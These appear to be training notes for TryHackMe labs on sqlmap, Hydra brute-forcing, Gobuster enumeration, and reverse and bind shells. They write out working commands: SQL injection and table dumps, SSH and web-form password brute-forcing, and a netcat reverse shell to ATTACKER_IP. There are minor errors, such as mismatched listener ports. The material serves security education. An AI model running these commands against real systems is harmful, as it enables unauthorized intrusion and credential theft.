# SQLMap - Offensive Security Tooling

## Overview

SQLMap is an automated tool to find and exploit SQL injection vulnerabilities in web applications. It supports various SQL injection techniques and database management systems.

## Basic Usage

### Starting sqlmap

sqlmap comes with banner display:
```
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org
```

## Testing for SQL Injection

### Basic URL Testing

To test a URL for SQL injection vulnerabilities:

```bash
sqlmap -u "http://sqlmaptesting.thmsearch/cat=1"
```

### Testing with Single Quotes

Include URL inside single quotes to avoid special character errors:

```bash
sqlmap -u 'http://sqlmaptesting.thmsearch/cat=1'
```

### In-depth Scanning

Add `--level=5` for comprehensive testing:

```bash
sqlmap -u 'http://sqlmaptesting.thmsearch/cat=1' --level=5
```

### Response to sqlmap Prompts

When running in-depth scans, respond to these prompts:

```
It looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]: y
For the remaining tests, do you want to include all tests for 'MySQL' extending provided risk (1) value? [Y/n]: y
Injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]: y
GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N]: n
```

## Real-World Examples

### Example 1: Testing cat Parameter

```bash
sqlmap -u 'http://sqlmaptesting.thmsearch/cat=1'
```

Output shows:
```
[08:50:46] [INFO] resuming back-end DBMS' mysql'
[08:50:46] [INFO] testing connection to the target URL
[08:50:46] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[08:50:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:50:46] [INFO] fetching tables for database: 'users'
Database: acuart
[3 tables]
+-----------+
| johnath   |
| alexas    |
| thomas    |
+-----------+
```

### Example 2: Dumping Table Contents

To extract records from a specific table:

```bash
sqlmap -u 'http://sqlmaptesting.thmsearch/cat=1' -D users -T thomas --dump
```

Output:
```
[08:51:48] [INFO] resuming back-end DBMS' mysql'
[08:51:48] [INFO] testing connection to the target URL
[08:51:49] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[08:51:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:51:49] [INFO] fetching columns for table 'thomas' in database 'users'
[08:51:49] [INFO] fetching entries for table 'thomas' in database' users'
[08:51:49] [INFO] recognized possible password hashes in column 'passhash'
do you want to store hashes to a temporary file for eventual further processing n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: users
Table: thomas
[1 entry]
+---------------------+------------+---------+
| Date                | name       | pass    |
+---------------------+------------+---------+
| 09/09/2024          | Thomas THM | testing |
+---------------------+------------+---------+
```

## POST Request Testing

For login or registration forms that use POST requests:

1. Intercept the POST request using browser developer tools
2. Save the request to a text file
3. Use the file with sqlmap:

```bash
sqlmap -r intercepted_request.txt
```

## Key Concepts

### GET vs POST Injection

- **GET parameters**: Visible in the URL, easier to test with `sqlmap -u`
- **POST parameters**: Sent in request body, require request interception and file input

### Parameter Identification

SQLMap identifies injection points through various techniques:
- Boolean-based blind
- Union query-based
- Error-based
- Time-based blind
- Stacked queries

### Database Information Gathering

Common information retrieval operations:
- `--dbs`: List all databases
- `-D <db>`: Specify database
- `--tables`: List tables in database
- `-T <table>`: Specify table
- `--columns`: List columns in table
- `--dump`: Extract table data
- `--dump-all`: Dump all databases

## TryHackMe Lab Notes

### Target Application

- **Login page**: `http://MACHINE_IP/ai/login`
- **User login URL**: `http://MACHINE_IP/ai/includes/user_login?email=test&password=test`

### Manual Parameter Extraction

For login pages where parameters aren't visible in URL:

1. Right-click on the login page → Inspect
2. Go to Network tab
3. Enter test credentials and click login
4. Click on the GET request in Network tab
5. Copy complete URL with parameters
6. Use with sqlmap

**Note**: Learning to intercept and capture POST requests is out-of-scope for this room.

## Important Notes

1. Always use the AttackBox for practical exercises
2. Include URLs inside single quotes in terminal
3. Use `--level=5` for thorough scanning
4. Be prepared to answer sqlmap prompts appropriately
5. Remember that legitimate security testing requires authorization
6. This training material is for educational purposes only

## Certificate Preparation Tips

- Understand boolean-based blind injection
- Learn database fingerprinting
- Practice dump operations for different data types
- Understand the difference between GET and POST parameter testing
- Review server and technology information gathering

---

# Hydra - Offensive Security Tooling

## Overview

Hydra is a brute force online password cracking program and a quick system login password "hacking" tool. It's commonly used for brute forcing login forms and authentication services.

## Installation

Hydra can be installed on various Linux distributions:

```bash
# On Ubuntu/Fedora
apt install hydra
dnf install hydra

# Or download from official repository
```

## Basic Usage

### FTP Brute Force

```bash
# Basic syntax
hydra -l <username> -P <password_list> MACHINE_IP ftp
```

### SSH Brute Force

```bash
# Multi-threaded SSH attack
hydra -l <username> -P <full_path_to_password> MACHINE_IP -t 4 ssh
```

Example:
```bash
hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh
```

### Web Form Brute Force

For brute forcing web forms (GET or POST), you need to know the request type:

```bash
sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```

Example to brute force POST login form:
```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

Example with port specification:
```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V
```

## Key Concepts

### Request Type Detection

- **GET requests**: Visible in URL, use browser's network tab
- **POST requests**: Sent in request body, use browser developer tools to inspect

### Common Attack Scenarios

- Service authentication brute forcing (FTP, SSH, Telnet)
- Web form login attempts
- Authentication service attacks

---

# Gobuster - Offensive Security Tooling

## Overview

Gobuster is an offensive security tool for reconnaissance, commonly used to enumerate web directories, subdomains, and virtual hosts. It follows a hands-on approach for practical learning.

## Installation

Access help page to verify installation:
```bash
gobuster --help
```

## Gobuster Modes

### 1. Directory Mode (`dir`)

Enumerates web directories and files:

**Basic command:**
```bash
gobuster dir -u "http://www.example.thm/" -w /usr/share/wordlists/dirb/small.txt -t 64
```

**Key flags explained:**
- `gobuster dir`: Directory and file enumeration mode
- `-u "http://www.example.thm/"`: Target URL
- `-w /usr/share/wordlists/dirb/small.txt`: Wordlist file
- `-t 64`: Number of threads

**Advanced directory scanning with redirect follow:**
```bash
gobuster dir -u "http://www.example.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
```

**With specific file extensions:**
```bash
gobuster dir -u "http://www.example.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.js
```

### 2. DNS Mode (`dns`)

Enumerates subdomains:

**Basic command:**
```bash
gobuster dns -d example.thm -w /path/to/wordlist
```

**Example with subdomain wordlist:**
```bash
gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Key flags explained:**
- `gobuster dns`: Subdomain enumeration mode
- `-d example.thm`: Target domain
- `-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`: Wordlist for subdomains

### 3. Virtual Host Mode (`vhost`)

Enumerates virtual hosts on the same server:

**Basic command:**
```bash
gobuster vhost -u "http://example.thm" -w /path/to/wordlist
```

## Important Flags

| Flag | Description |
|------|-------------|
| `-r` / `--followredirect` | Follow HTTP redirect responses (301, 302) |
| `-x .ext,.ext2` | Add file extensions to wordlist entries |
| `-t <num>` | Number of threads to use |
| `-u <url>` | Target URL |
| `-w <wordlist>` | Wordlist file path |
| `--domain <domain>` | Set top and second-level domains |
| `--exclude-length <size>` | Filter false positives by response size |

## Mode Comparison

| Mode | Purpose | Target |
|------|---------|--------|
| `dir` | Directory/file enumeration | Web directory paths |
| `dns` | Subdomain enumeration | DNS records |
| `vhost` | Virtual host enumeration | Same server, different hostnames |

## Difference: Virtual Hosts vs Subdomains

- **Virtual Hosts**: IP-based, running on the same server
- **Subdomains**: Set up in DNS, different from main domain

---

# Shells - Offensive Security Tooling

## Overview

Shells are software allowing users to interact with an operating system. In offensive security, shells are widely used by attackers to remotely control systems, making them an important part of the attack chain.

## What is a Shell?

A shell is software that allows user interaction with the OS, typically a command-line interface. In cyber security, it refers to a shell session an attacker uses when accessing a compromised system, allowing them to run commands and execute software.

## Attack Capabilities via Shell

- **Remote System Control**: Execute commands remotely on target system
- **Privilege Escalation**: Explore ways to gain elevated/admin access
- **Data Exfiltration**: Read and copy sensitive data from system
- **Persistence Access**: Create users/credentials or backdoor software
- **Post-Exploitation Activities**: Deploy malware, create hidden accounts, delete information
- **Network Pivoting**: Use shell as access point to other network systems

## Types of Shells

### 1. Reverse Shell

A reverse shell initiates from the target system to the attacker's machine, helping avoid detection from network firewalls.

**How Reverse Shells Work:**

**Step 1: Set up Netcat Listener**
```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...
```

**Step 2: Execute Reverse Shell Payload**
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

**Payload Explanation:**
- `rm -f /tmp/f`: Remove existing named pipe
- `mkfifo /tmp/f`: Create named pipe for bi-directional communication
- `cat /tmp/f`: Read data from pipe
- `| bash -i 2>&1`: Pipe to interactive shell instance, redirect stderr to stdout
- `| nc ATTACKER_IP ATTACKER_PORT`: Send shell output through Netcat to attacker
- `>/tmp/f`: Send commands' output back into named pipe

**Attacker Receives Shell:**
```
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.
target@tryhackme:~$
```

### 2. Bind Shell

A bind shell binds a port on the compromised system and listens for a connection from the attacker.

**How Bind Shells Work:**

**Step 1: Set Up Bind Shell on Target**
```bash
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

**Payload Explanation:**
- Same as reverse shell, but with `nc -l 0.0.0.0 8080` instead of connection to attacker
- Listens on all interfaces (0.0.0.0) and port 8080

**Step 2: Attacker Connects to Port**
```bash
attacker@kali:~$ nc TARGET_IP 8080
```

## Key Differences

| Feature | Reverse Shell | Bind Shell |
|---------|---------------|------------|
| Initiation | Target connects to attacker | Attacker connects to target |
| Firewall | Easier to bypass | May be blocked |
| Port | Known to attacker | Requires attacker to connect |
| Popularity | More common | Less common |

## Common Reverse Shell Payloads

Various payloads exist depending on the compromised system's tools and OS. These include:
- Bash-based payloads
- Python-based payloads
- Perl-based payloads
- Netcat-based payloads
- Custom shell scripts

## Certificate Preparation Tips

- Understand the difference between reverse and bind shells
- Practice setting up Netcat listeners
- Learn various shell payload formats
- Understand named pipes and their role in shell communication
- Know when to use which shell type based on network constraints